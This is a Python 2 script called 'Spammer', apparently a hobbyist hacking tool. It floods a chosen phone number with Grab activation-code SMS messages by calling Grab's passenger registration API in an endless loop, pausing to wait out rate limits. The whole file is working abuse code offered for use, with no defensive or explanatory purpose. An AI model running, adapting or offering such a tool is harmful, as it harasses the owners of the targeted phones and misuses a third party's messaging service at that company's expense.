#!/usr/bin/python

# - Spammer
# | Description: spams a phone number by sending it a lot of sms by using Grab API
# | Author: P4kL0nc4t
# | Date: 4/11/2017

print """\
   ____                             
  / __/__  ___ ___ _  __ _  ___ ____
 _\ \/ _ \/ _ `/  ' \/  ' \/ -_) __/
/___/ .__/\_,_/_/_/_/_/_/_/\__/_/   
   /_/  P4kL0nc4t Spammer (GRAB)
"""
import requests
import datetime
import sys
import time
import argparse

parser = argparse.ArgumentParser(prog="Spammer", description="Spammer is a tool used to send Grab Activation Code (SMS) to a phone number repeatedly. Spammer uses Grab's passenger API.", epilog="If you had stuck, you can mail me at p4kl0nc4t@obsidiancyberteam.id")
parser.add_argument("phonenum", metavar="phone", help="the phone number to send the GAC SMS. (example: 6285237048641)")
args = parser.parse_args()

def showstatus(message, type="new"):
	now = datetime.datetime.now().strftime("%H:%M:%S")
	icon = "*"
	if type == "warn":
		icon = "!"
	elif type == "new":
		icon == "*"
	message = "[" + icon + "][" + now + "]" + message
	return message

def wrapsbrace(string, endspace=False):
	if endspace == True:
		return "[" + string + "] "
	else:
		return "[" + string + "]"
def sleep(x):
	try:
		time.sleep(x)
	except KeyboardInterrupt:
		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Exiting . . .", "warn")
		exit()

_phone = args.phonenum
iteration = 1
print showstatus(wrapsbrace("info", True) + "Send GAC SMS to: {}".format(_phone))
while True:
	try:
		r = requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'curl/7.52.1'})
	except KeyboardInterrupt:
		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Exiting . . .", "warn")
		exit()
	except requests.exceptions.ConnectionError:
		print showstatus(wrapsbrace("except", True) + "ConnectionError thrown! Sleeping for 60s . . .", "warn")
		sleep(60)
	else:
		if r.status_code == 429:
			print showstatus(wrapsbrace("429 {}".format(r.reason), True) + "Sleeping for 60s . . .", "warn")
			sleep(60)
		elif r.status_code == 200:
			print showstatus(wrapsbrace("200 OK", True) + "GAC SMS sent! Sleeping for 60s . . . (iteration:{})".format(iteration))
			iteration += 1
			sleep(60)
		else:
			print showstatus(wrapsbrace("{} {}".format(r.status_code, r.reason), True) + "Something went wrong. Exiting . . .", "warn")
			exit()
